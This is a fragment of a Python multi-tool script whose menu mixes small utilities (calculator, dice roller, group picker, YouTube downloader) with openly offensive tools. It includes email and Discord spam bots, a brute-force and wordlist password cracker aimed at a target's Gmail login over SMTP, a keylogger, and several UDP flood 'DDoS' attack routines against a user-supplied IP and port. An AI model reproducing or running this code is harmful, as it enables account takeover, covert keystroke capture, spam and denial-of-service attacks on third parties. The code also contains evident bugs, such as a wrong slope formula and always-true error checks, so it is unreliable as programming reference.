    elif instruction.lower() == "writeemail":
        while True:
            try:
                gmail = smtplib.SMTP('smtp.gmail.com', 587)
                gmail.starttls()
                fromaddr = input("[+] Enter your email: ")
                password = input("[+] Enter your password: ")
                gmail.login(fromaddr, password)
                break
            except:
                print("[+] You entered the wrong password.")
        print("")
        while True:
            attachfile = input("[+] Do you want to send files?(yes/no): ")
            if attachfile.lower() == "yes":
                print("[+] You choose to send files.")
                break
            elif attachfile.lower() == "no":
                print("[+] You don't choose to send files.")
                break
            else:
                print("[+] Invalid input.")
        print("")
        while True:
            try:
                print("[+] Current working directory:", os.getcwd())
                toaddr = input("[+] Enter the email address you choose to send this too: ")
                subject = input("[+] Enter a subject to the email: ")
                msg = MIMEMultipart()
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg['Subject'] = subject
                content = input("[+] Enter your message: ")
                msg.attach(MIMEText(content, 'plain'))

                if attachfile.lower() == "yes":
                    filename = input("[+] Enter the file attachment to your email(has to include the directory): ")
                    attachment = open(filename, "rb")
                    attach = MIMEBase('application', 'octet-stream')
                    attach.set_payload((attachment).read())
                    encoders.encode_base64(attach)
                    attach.add_header('Content-Disposition', f"attachment; filename= {filename}")
                    msg.attach(attach)

                gmail = smtplib.SMTP('smtp.gmail.com', 587)
                gmail.starttls()
                gmail.login(fromaddr, password)
                text = msg.as_string()
                gmail.sendmail(fromaddr, toaddr, text)
                gmail.quit()
                print("[+] The email has been sent.")
                print("")
                break
            except:
                if FileNotFoundError:
                    print("[+] File does not exist.")
                    print("")
                    pass
                else:
                    print("[+] There was an error with sending the email.")
                    print("")
    elif instruction.lower() == "emailspambot":
        print("[+] This goes into a loop. There is no coming back! You must restart the script to use the other features from now on.")
        your_email = input('[+] What is your email?: ')
        your_password = input('[+] What is your password?: ')
        subjects = input("[+] What is the subject that you want?: ")
        content = input("[+] What do you want to say in the spam email?: ")
        reciever = input("[+] What is the email of the reciever?: ")
        print("")
        try:
            subject = subjects
            mail = smtplib.SMTP('smtp.gmail.com', 587)
            mail.ehlo()
            mail.starttls()
            mail.login(your_email, your_password)
            content = f'Subject: {subject}\n\n{content}'
        except:
            if smtplib.SMTPAuthenticationError:
                print("[+] You have entered the wrong password.")
                stop = True
        while True:
            try:
                if stop:
                    break
                mail.sendmail(your_email, reciever, content)
                print("[+] The Email has Been sent to", reciever)
            except:
                pass
    elif instruction.lower() == "discordspambot":
        print("[+] Be Aware to put discord in full screen mode.")
        print("[+] There is also no turning back! You have to rerun the script to use other features.")
        print("")
        Spam = input("[+] Write your spam here: ")
        input("[Press ENTER when ready to spam] ")
        pyautogui.click(392, 1005)
        while True:
            pyautogui.typewrite(Spam)
            pyautogui.press("enter")
            time.sleep(0.7)
    elif instruction.lower() == "antiAFKmcBot":
        try:
            print("[+] Make sure to semi-full screen.")
            print("[+] There is also no turning back! You have to rerun the script to use other features.")
            timeout_time = int(input("[+] What is the AFK timeout time(minutes)?: "))
            timeout_time *= 60
            server_ip = input("[+] What is the server IP?: ")
            typed_ip = False
            while True:
                time.sleep(timeout_time)
                pyautogui.click(950, 571)
                print("[+] You were afk Kicked.")
                time.sleep(2)
                pyautogui.click(960, 947)
                if not typed_ip:
                    pyautogui.click(775, 276)
                    time.sleep(1)
                    pyautogui.click(775, 276)
                    time.sleep(1)
                    pyautogui.typewrite(server_ip)
                    time.sleep(3)
                    typed_ip = True
                time.sleep(1)
                pyautogui.click(996, 515)
                time.sleep(1)
                pyautogui.click(996, 515)
                time.sleep(1)
        except:
            if ModuleNotFoundError:
                print("[+] Modules That May Require Downloading: pyautogui")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install pyautogui")
                print("")
            elif AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] There was an error.")
    elif instruction.lower() == "discordcountbot":
        try:
            print("[+] Be Aware to put discord in full screen mode.")
            print("[+] There is also no turning back! You have to rerun the script to use other features.")
            Spam = int(input("[+] Type initial number: "))
            slowmode_time = int(input("[+] How many seconds is the slowmode timer?: "))
            pyautogui.click(392, 1005)
            while True:
                pyautogui.typewrite(str(Spam))
                pyautogui.press("enter")
                Spam = str(int(Spam) + 1)
                time.sleep(slowmode_time)
        except:
            if ModuleNotFoundError:
                print("[+] Modules That May Require Downloading: pyautogui")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install pyautogui")
                print("")
            elif AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] There was an error.")
    elif instruction.lower() == "autoclicker":
        print("[+] There is no coming back! You need to rerun the script to use the other features!")
        try:
            delay = float(input("[+] What is the delay of the autoclicker?(seconds): "))
            while True:
                pyautogui.doubleClick()
                time.sleep(delay)
        except:
            if TypeError:
                print("[+] You are supposed to type a number.")
            else:
                print("[+] There is an error.")
    elif instruction.lower() == "namepicker":
        ask = True
        ask2 = False
        people = []
        while ask:
            names = input("[+] What person should I add?: ")
            ask2 = True
            people.append(names)
            person_count = len(people)
            print("[+] Looks like you have added", names, "to the list.")
            time.sleep(1)
            if person_count == 1:
                print("[+] There are currently", person_count, "person in the list.")
            if person_count > 1:
                print("[+] There are currently", person_count, "people in the list.")
            time.sleep(1)
            while ask2:
                doagain = input("[+] Do you wish to add another name?(yes/no): ")
                if doagain == "yes":
                    ask2 = False
                elif doagain == "no":
                    ask3 = True
                    while ask3:
                        try:
                            random.shuffle(people)
                            person_picked = people[0]
                            del people[0]
                            print("[+] Looks like " + person_picked + " is the lucky person!")
                            person_count = len(people)
                            time.sleep(1)
                            if person_count == 1:
                                print("[+] There are currently", person_count, "person left in the list.")
                            if person_count > 1:
                                print("[+] There are currently", person_count, "people left in the list.")
                            if person_count == 0:
                                doagain2 = "no"
                            time.sleep(1)
                            if person_count > 0:
                                doagain2 = input("[+] Would you like to pick another name?(yes/no): ")
                            if doagain2 == "yes":
                                ask3 = True
                            elif doagain2 == "no":
                                ask4 = True
                                while ask4:
                                    if person_count == 0:
                                        print("[+] There is nobody left in the name picker.")
                                    time.sleep(1)
                                    doagain4 = input("[+] Would you like to redo the name picker?(yes/no): ")
                                    if doagain4 == "yes":
                                        print("[+] Restarting.....")
                                        people = []
                                        time.sleep(2)
                                        ask4 = False
                                        ask3 = False
                                        ask2 = False
                                    elif doagain == "no":
                                        ask4 = False
                                        ask3 = False
                                        ask2 = False
                                        ask = False
                                        print("")
                                    else:
                                        print("[+] Invalid Input.")
                            else:
                                print("[+] Invalid Input.")
                        except IndexError:
                            print("[+] There is nobody left to pick!")
                            ask4 = True
                            while ask4:
                                doagain4 = input("[+] Would you like to redo the name picker?(yes/no): ")
                                if doagain4 == "yes":
                                    print("[+] Restarting.....")
                                    people = []
                                    time.sleep(2)
                                    ask4 = False
                                    ask3 = False
                                    ask2 = False
                                elif doagain == "no":
                                    ask4 = False
                                    ask3 = False
                                    ask2 = False
                                    ask = False
                                    print("")
                                else:
                                    print("[+] Invalid Input.")
                else:
                    print("[+] Invalid input.")
    elif instruction.lower() == "calc":
        def add(x, y):
            return x + y
        def subtract(x, y):
            return x - y
        def multiply(x, y):
            return x * y
        def divide(x, y):
            return x / y
        def exponent(x, y):
            return math.pow(x, y)
        def squareroot(x):
            return math.sqrt(x)
        calculate = True
        while calculate:
            try:
                x = float(input("[+] What is your first number?: "))
                y = float(
                    input("[+] What is your second number(this will not matter if you are calculating square roots)?: "))
                answer = add(x, y)
                operation = input("[+] What type of equation?(add, subtract, divide, multiply, exponent, squareroot): ")
                if operation == "add":
                    answer = add(x, y)
                    correct = True
                elif operation == "subtract":
                    answer = subtract(x, y)
                    correct = True
                elif operation == "divide":
                    answer = divide(x, y)
                    correct = True
                elif operation == "multiply":
                    answer = multiply(x, y)
                    correct = True
                elif operation == "exponent":
                    answer = exponent(x, y)
                    if OverflowError:
                        print("[+] The answer is way too big! Try another smaller exponent!")
                    correct = True
                elif operation == "[+] squareroot":
                    answer = squareroot(x)
                    correct = True
                elif operation != "add" and operation != "subtract" and operation != "multiply" and operation != "divide" and operation != "exponent" and operation != "squareroot" and not OverflowError:
                    print("[+] Invalid Input")
                    correct = False
                if correct:
                    print("[+] The answer to the equation was:", answer)
                    doitagain = input("[+] Do you wish to use the calculator again?(y/n): ")
                    if doitagain == "y" or doitagain == "yes":
                        calculate = True
                    elif doitagain == "n" or doitagain == "no":
                        calculate = False
                        print("")
                else:
                    print("[+] Invalid operation.")
            except ZeroDivisionError:
                print("[+] Zero Division is impossible!")
            except OverflowError:
                print("[+] The answer is too big!")
            except ValueError:
                print("[+] Invalid Input.")
            except NameError:
                print("[+] Invalid Input.")
    elif instruction.lower() == "braillcalc":
        def power(x, y):
            return math.pow(x, y)
        ask = True
        while ask:
            try:
                x = 2
                y = 1
                loopnumber = int(input("[+] What is the dot count in the braille formation?: "))  # for the max loop count
                loopnumber += 1
                loops = 1
                thingy = 0
                ask2 = False
                while loops < loopnumber:
                    try:
                        thingy = power(x, y)
                        print("[+] The amount of braille combinations for", loops, "dots is:", thingy)
                        y += 1
                        loops += 1
                        if loops == loopnumber:
                            loops += 1
                    except OverflowError:
                        print("[+] The Number is too big now.")
                        loops = loopnumber + 10
                if loops > loopnumber:
                    ask2 = True
                    while ask2:
                        do_again = input("[+] Would you like to use this again?: ")
                        if do_again == "y" or do_again == "yes":
                            ask = True
                            ask2 = False
                        elif do_again == "n" or do_again == "no":
                            ask = False
                            ask2 = False
                            print("")
                        else:
                            print("[+] invalid input.")
            except ValueError:
                print("[+] Invalid Input.")
    elif instruction.lower() == "groupcreator":
        ask = True
        ask2 = True
        ask3 = True
        friends = []
        print("")
        while ask:
            new_person = str(input("[+] Who is being added to the list?: "))
            friends.insert(3, new_person)
            friends.pop
            friends.sort()
            personcount = len(friends)
            print("[+] The current number of people is:", personcount)
            ask2 = True
            while ask2:
                continue_count = input("[+] Do you wish to continue adding people(y/n)?: ")
                if continue_count == "y" or continue_count == "yes":
                    ask2 = False
                elif continue_count == "n" or continue_count == "no":
                    ask2 = True
                    random.shuffle(friends)
                    group_number = 1
                    assign = True
                    while assign:
                        try:
                            random.shuffle(friends)
                            person1 = friends[0]
                            person2 = friends[1]
                            print("[+] Assigning Team", group_number)
                            time.sleep(2)
                            print("[+] This group consists of:", person1, "and", person2)
                            del friends[0]
                            time.sleep(0.01)
                            del friends[0]
                            group_number += 1
                            personcount -= 2
                            time.sleep(3)
                            if personcount < 1:
                                while ask3:
                                    doagain = input("[+] Do you wish to use the group assigner again?: ")
                                    if doagain == "y" or doagain == "yes":
                                        friends = []
                                        ask2 = False
                                        ask3 = False
                                        assign = False
                                    elif doagain == "n" or doagain == "no":
                                        ask2 = False
                                        ask3 = False
                                        assign = False
                                        ask = False
                                        print("")
                                    else:
                                        print("[+] Invalid Input.")
                        except IndexError:
                            lastperson = friends.pop(0)
                            remaining_person = random.randint(1, group_number)
                            print("[+] There is a remaining person.")
                            time.sleep(2)
                            print("[+] The remaining person is", lastperson)
                            time.sleep(2)
                            print("[+] S/he is in group", remaining_person)
                            time.sleep(2)
                            assign = False
                            while ask3:
                                doagain = input("[+] Do you wish to use the group assigner again?: ")
                                if doagain == "y" or doagain == "yes":
                                    friends = []
                                    ask2 = False
                                    ask3 = False
                                    assign = False
                                elif doagain == "n" or doagain == "no":
                                    ask2 = False
                                    ask3 = False
                                    assign = False
                                    ask = False
                                    print("")
                                else:
                                    print("[+] Invalid Input.")
                else:
                    print("[+] Invalid input.")
    elif instruction.lower() == "diceroller":
        roll = True
        ask = True
        question_answered = False
        while ask:
            try:
                min_number = int(input("[+] What is the minimum value for the dice?: "))
                max_number = int(input("[+] What is the max value for the dice?: "))
                ask = False
                question_answered = True
            except:
                print("[+] Invalid Input. Try to put proper numbers.")
        while roll:
            if min_number > max_number:
                print("[+] Try not to make the minimun bigger than the bigger number.")
                min_number = int(input("[+] What is the minimum value for the dice?: "))
                max_number = int(input("[+] What is the max value for the dice?: "))
                question_answered = True
            if question_answered:
                dice_roll = random.randint(min_number, max_number)
                print("[+] You have rolled:", dice_roll)
                question_answered = False
            rollagain = input("[+] Do you wish to roll again?(y/n): ")
            if rollagain == "y" or rollagain == "yes":
                roll = True
                question_answered = True
            elif rollagain == "n" or rollagain == "no":
                roll = False
                print("")
            else:
                print("[+] Invalid input.")
    elif instruction.lower() == "generatepassword":
        password_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                            'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                            '4', '5', '6', '7', '8', '9', '0']
        while True:
            try:
                characters = int(input("[+] How many characters do you want your password to be?: "))
                break
            except:
                print("[+] Invalid Input.")
        password = ""
        for letter in range(characters):
            password_letter = password_letters[random.randint(0, 61)]
            password = str(password_letter) + str(password)
        print("[+] Randomly generated password is:", password)
        print("")
    elif instruction.lower() == "downloadytvid":
        try:
            video_list = []
            print("[+] Enter the video URLs below(input stop to stop).")
            while True:
                url = input("[+] Url Here: ")
                if url.lower() == "stop":
                    break
                video_list.append(url)
            itag = int(input("[+] What itag do you want to download the video from?(720p video is 22, 128kbps is 140): "))
            for list_item, video in enumerate(video_list):
                try:
                    vid = pytube.YouTube(video)
                    stream1 = vid.streams.get_by_itag(itag)
                    print(f"[+] Downloading video {list_item}...")
                    stream1.download()
                    print("[+] Done!")
                except:
                    if AttributeError:
                        print(f"[+] Video {list_item} could not be downloaded because the provided itag cannot be used for it.")
        except:
            if ModuleNotFoundError:
                print("")
                print("[+] Modules That May Require Downloading: pytube")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install pytube")
                print("")
    elif instruction.lower() == "passwordcracker":
        print("[+] This will take a lot of time. The script will not stop unless terminated manually or if it finds the correct password.")
        while True:
            try:
                target_email = input("[+] Enter the targets email: ")
                characters = int(input("[+] How many characters is the password?: "))
                break
            except:
                print("[+] Invalid Input.")
        ask = True
        while ask:
            print("[+] 'numeric2' type is more accurate than 'numeric' but may also be slower.")
            pass_type = input("[+] What does the password have?(alllower/allupper/nonnumeric/numericupper/numericlower/all/numeric/numeric2): ")
            if pass_type.lower() == "alllower":
                password_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                                    'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                    'w', 'x', 'y', 'z']
                ask = False
            elif pass_type.lower() == "allupper":
                password_letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G',
                                    'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                                    'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                ask = False
            elif pass_type.lower() == "nonnumeric":
                password_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                                    'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                    'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                                    'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                                    'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                ask = False
            elif pass_type.lower() == "numericupper":
                password_letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G',
                                    'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                                    'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                                    '4', '5', '6', '7', '8', '9', '0']
                ask = False
            elif pass_type.lower() == "numericlower":
                password_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                                    'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                    'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7',
                                    '8', '9', '0']
                ask = False
            elif pass_type.lower() == "all":
                password_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                                    'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                    'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                                    'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                                    'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                                    '4', '5', '6', '7', '8', '9', '0']
                ask = False
            elif pass_type.lower() == "numeric" or "numeric2":
                password_letters = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
                ask = False
            else:
                print("[+] Invalid Input.")
        list_count = len(password_letters) - 1
        guess = ""
        gmail = smtplib.SMTP("smtp.gmail.com", 587)
        gmail.starttls()
        gmail.ehlo()
        if pass_type.lower() == "numeric2":
            guess = "1"
            for letter in range(characters - 1):
                guess_letter = "0"
                guess = str(guess) + str(guess_letter)
            while True:
                try:
                    gmail.login(user=target_email, password=guess)
                    print("[+] Found a correct password:", guess)
                    break
                except:
                    if smtplib.SMTPAuthenticationError:
                        print("[+] Found an incorrect password:", guess)
                        guess = str(int(guess) + 1)
        else:
            while True:
                try:
                    guess = ""
                    for letter in range(characters):
                        guess_letter = password_letters[random.randint(0, list_count)]
                        guess = str(guess_letter) + str(guess)
                    gmail.login(user=target_email, password=guess)
                    print("[+] Found a correct password:", guess)
                    print("")
                    gmail.close()
                    break
                except:
                    if smtplib.SMTPAuthenticationError:
                        print("[+] Found an incorrect password:", guess)
    elif instruction.lower() == "txtfilepasswordcracker":
        print("[+] This will take a lot of time. The script will not stop unless terminated manually or if it finds the correct password.")
        gmail = smtplib.SMTP("smtp.gmail.com", 587)
        gmail.ehlo()
        gmail.starttls()
        loop1 = True
        while loop1:
            try:
                target = input("[+] Enter the targets email address: ")
                time.sleep(0.2)
                password_file = input("[+] Enter the directory of where all the passwords are stored(you can also put the .txt file in the venv folder): ")
                password_file = open(password_file, "r")
                loop1 = False
            except:
                if FileNotFoundError:
                    print("The file does not exist. You may have entered a typo.")
        success = False
        for password in password_file:
            try:
                gmail.login(target, password)
                print("[+] A password Match has been found!:", password)
                success = True
                gmail.close()
                break
            except smtplib.SMTPAuthenticationError:
                print("[+] Incorrect Password: ", password)
        if not success:
            print("[+] Unable to find the correct password.")
            gmail.close()
    elif instruction.lower() == "keylogger":
        username = os.getlogin()
        logging_directory = f"C:/Users/{username}/Desktop"
        logging.basicConfig(filename=f"{logging_directory}/keylog.txt", level=logging.DEBUG,format=f"%(asctime)s: %(message)s")
        print("The key logger has been started. Terminate the program to stop it.")
        while True:
            try:
                with Listener(on_press=logging.info) as listener:
                    listener.join()
            except:
                if ModuleNotFoundError:
                    print("")
                    print("[+] Modules That May Require Downloading: pynput")
                    print("[+] How To Download Them:")
                    print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install pynput")
                print("")
    elif instruction.lower() == "sendwhatsapp":
        try:
            print("[+] Make sure you put google on fullscreen during the wait time.")
            phone_number = input("[+] What is the phone number of the recipient?(make sure to put dashes in between the spaces): ")
            hour = int(input("[+] What hour of the day do you want to send this message?: "))
            minute = int(input("[+] What is the minute of the hour that you want to send this message to?: "))
            message = input("[+] What do you want to say in the message?: ")
            pywhatkit.sendwhatmsg(phone_no=phone_number, time_hour=hour, time_min=minute, message=message)
            print("")
        except:
            print("[+] There was an error with sending the whatsapp message.")
    elif instruction.lower() == "dictionaryattacktester":
        ask = True
        while ask:
            user_pass = input("[+] Enter your password: ")
            print("[+] 'numeric2' type is more accurate than 'numeric' but may also be slower.")
            pass_type = input("[+] What does the password have?(alllower/allupper/nonnumeric/numericupper/numericlower/all/numeric/numeric2): ")
            if pass_type.lower() == "alllower":
                password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                            'w', 'x', 'y', 'z', ]
                ask = False
            elif pass_type.lower() == "allupper":
                password = ['A', 'B', 'C', 'D', 'E', 'F', 'G',
                            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                ask = False
            elif pass_type.lower() == "nonnumeric":
                password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                            'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                ask = False
            elif pass_type.lower() == "numericupper":
                password = ['A', 'B', 'C', 'D', 'E', 'F', 'G',
                            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                            '4', '5', '6', '7', '8', '9', '0']
                ask = False
            elif pass_type.lower() == "numericlower":
                password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                            'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7',
                            '8', '9', '0']
                ask = False
            elif pass_type.lower() == "all":
                password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                            'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                            'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                            '4', '5', '6', '7', '8', '9', '0']
                ask = False
            elif pass_type.lower() == "numeric" or "numeric2":
                password = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
                ask = False
            else:
                print("[+] Invalid Input.")
        if pass_type.lower() == "numeric2":
            guess = "1"
            for letter in range(len(user_pass) - 1):
                guess_letter = "0"
                guess = str(guess) + str(guess_letter)
            while True:
                if guess == user_pass:
                    break
                elif guess != user_pass:
                    print("[+] Found an incorrect password:", guess)
                    guess = str(int(guess) + 1)
            print("[+] Found a correct password:", guess)
        else:
            list_count = len(password) - 1
            guess = ""
            while guess != user_pass:
                guess = ""
                for letter in range(len(user_pass)):
                    guess_letter = password[random.randint(0, list_count)]
                    guess = str(guess_letter) + str(guess)
                if guess != user_pass:
                    print("[+] Found an incorrect password:", guess)
            print("[+] Found a correct password:", guess)
            print("")
    elif instruction.lower() == "gethostbyaddr":
        try:
            IP = input("[+] What is the IPv4 Address that you want to put in?: ")
            hostname = socket.gethostbyaddr(IP)
            print("[+] The host for the address provided is:", IP)
        except:
            if AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] There was an error with getting the host.")
                print("")
    elif instruction.lower() == "ddosattack":
        def regular():
            print("")
            print("[Simple DDoS Script]")
            print("Please don't use this for any illegal purposes.")
            print("")
            while True:
                try:
                    port = int(input("[+] Enter the port to attack: "))
                    ip = input("[+] Enter the IP that is being attacked: ")
                    ip = socket.gethostbyname(ip)
                    attack_count = int(input("[+] How many requests do you want to send?: "))
                    delay = float(input("[+] What is the delay of the attack?(seconds before attacking again): "))
                    packet = random._urandom(1490)
                    break
                except:
                    print("[+] Invalid Input.")
            try:
                print("[+] Preparing Attack for IP:", ip)
                ms = pythonping.ping(ip)
                ms = ms.rtt_avg_ms
                print("[+] Ping of Server:", ms)
            except:
                pass
            time.sleep(1)
            prevcount = 0
            print("")
            sent = 0
            request_sent = 0
            def attack():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
                sock.close()
                global request_sent
                request_sent += 1
                print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")
                if request_sent >= attack_count:
                    ms = pythonping.ping(ip)
                    ms = ms.rtt_avg_ms
                    print("[+] DDoS Attack Done")
                    print("[+] Ping of Server:", ms)
                    quit()
            while True:
                if sent >= attack_count:
                    break
                    quit()
                for i in range(attack_count):
                    try:
                        x = threading.Thread(target=attack)
                        x.start()
                        sent += 1
                        if sent >= attack_count:
                            break
                            quit()
                        time.sleep(delay)  # for some safetly lol
                    except:
                        pass
        def clean():
            print("")
            print("[Simple Clean Looking DDoS Script]")
            print("Please don't use this for any illegal purposes.")
            print("")
            while True:
                try:
                    port = int(input("[+] Enter the port to attack: "))
                    ip = input("[+] Enter the IP that is being attacked: ")
                    ip = socket.gethostbyname(ip)
                    attack_count = int(input("[+] How many requests do you want to send?: "))
                    delay = float(input("[+] What is the delay of the attack?(seconds before attacking again): "))
                    packet = random._urandom(1490)
                    break
                except:
                    print("[+] Invalid Input.")
            try:
                print("[+] Preparing Attack for IP:", ip)
                ms = pythonping.ping(ip)
                ms = ms.rtt_avg_ms
                print("[+] Ping of Server:", ms)
            except:
                pass
            time.sleep(1)
            prevcount = 0
            print("")
            sent = 0
            request_sent = 0
            for i in range(attack_count):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.connect((ip, port))
                    sock.sendto(packet, (ip, port))
                    sock.close()
                    sent += 1
                    print(f"[+] DDoS Attack {port} Port - IP: {ip} - {sent} Requests Sent")
                    if sent >= attack_count:
                        ms = pythonping.ping(ip)
                        ms = ms.rtt_avg_ms
                        print("[+] DDoS Attack Done")
                        print("[+] Ping of Server:", ms)
                        quit()
                    time.sleep(delay)  # for some safetly lol
                except:
                    pass
        def nonstop():
            print("")
            print("[Simple Non-Stop DDoS Script]")
            print("Please don't use this for any illegal purposes.")
            print("")
            while True:
                try:
                    port = int(input("[+] Enter the port to attack: "))
                    ip = input("[+] Enter the IP that is being attacked: ")
                    ip = socket.gethostbyname(ip)
                    packet = random._urandom(1490)
                    break
                except:
                    print("[+] Invalid Input.")
            try:
                print("[+] Preparing Attack for IP:", ip)
            except:
                pass
            time.sleep(1)
            print("")
            sent = 0
            while True:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.connect((ip, port))
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    print(f"[+] DDoS Attack {port} Port - IP: {ip} - {sent} Requests Sent")
                except:
                    pass
        def nonstop2():
            print("")
            print("[Simple Non-Stop DDoS Script]")
            print("Please don't use this for any illegal purposes.")
            print("")
            while True:
                try:
                    port = int(input("[+] Enter the port to attack: "))
                    ip = input("[+] Enter the IP that is being attacked: ")
                    ip = socket.gethostbyname(ip)
                    packet = random._urandom(1490)
                    break
                except:
                    print("[+] Invalid Input.")
            try:
                print("[+] Preparing Attack for IP:", ip)
            except:
                pass
            time.sleep(1)
            prevcount = 0
            print("")
            sent = 0
            request_sent = 0
            def attack():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
                sock.close()
                global request_sent
                request_sent += 1
                print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")
            while True:
                try:
                    x = threading.Thread(target=attack)
                    x.start()
                    sent += 1
                except:
                    pass
        while True:
            print("")
            ddos = input("[+] Which DDoS Script do you want to use?(regular/clean/nonstop/nonstop2): ")
            if ddos.lower() == "regular" or ddos.lower() == "clean" or ddos.lower() == "nonstop" or ddos.lower() == "nonstop2":
                break
            else:
                print("[+] Invalid Input.")
        if ddos.lower() == "regular":
            regular()
            print("")
        elif ddos.lower() == "clean":
            clean()
            print("")
        elif ddos.lower() == "nonstop":
            nonstop()
            print("")
        elif ddos.lower() == "nonstop2":
            nonstop2()
        time.sleep(1)
        print("")
        sent = 0
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
                sent += 1
                print(f"[+] DDoS Attack {port} Port - IP: {ip} - {sent} Requests Sent")
            except:
                pass
    elif instruction.lower() == "getping":
        try:
            ip = input("[+] Enter the Name of the device: ")
            ip = socket.gethostbyname(ip)
            ms = pythonping.ping(ip)
            ms = ms.rtt_avg_ms
            print("[+] The ping of the device is:", ms, "ms.")
            print("")
        except:
            print("[+] There was an error with getting the ping of the device.")
            print("")
    elif instruction.lower() == "slopecalc":
        while True:
            while True:
                try:
                    x1 = int(input("[+] What is the x pos of the first point?: "))
                    y1 = int(input("[+] What is the y pos of the first point?: "))
                    x2 = int(input("[+] What is the x pos of the second point?: "))
                    y2 = int(input("[+] What is the y pos of the second point?: "))
                    break
                except:
                    if TypeError:
                        print("[+] You are supposed to type an integer.")
                    else:
                        print("[+] Invalid Input.")
            def slope(x1, x2, y1, y2):
                return (y2 - y1) / (x2 - y2)
            try:
                m = slope(x1, x2, y1, y2)
                print("[+] The Slope is", m)
            except:
                if ZeroDivisionError:
                    if (y1 - y2) == 0:
                        print("[+] The slope is 0.")
                    else:
                        print("[+] The Slope is undefined.")
                else:
                    print("[+] Invalid Input.")
                    print("")
    elif instruction.lower() == "devdiscord":
        print("[+] The Developer's Discord is: DrSquid™#7711")
        print("[+] Text him if you have any errors!")
        print("")
